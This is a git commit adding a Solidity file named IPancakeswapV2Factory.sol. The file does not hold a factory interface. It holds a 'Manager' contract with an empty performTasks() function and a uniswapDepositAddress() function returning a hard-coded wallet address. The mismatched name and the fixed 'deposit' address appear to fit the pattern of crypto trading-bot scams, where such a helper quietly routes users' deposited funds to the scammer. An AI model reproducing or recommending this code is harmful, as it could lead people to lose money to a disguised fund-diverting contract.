b78d9cb1618904ae2a69b4066983b1eb37f313b5
dancha810 <97343044+dancha810@users.noreply.github.com>
2022-01-09 10:08:47 +0800

    Add files via upload

---
+++ IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xa8E7b451D0624FD90514840e0b7DC58b34bc169f;
+	}
+}
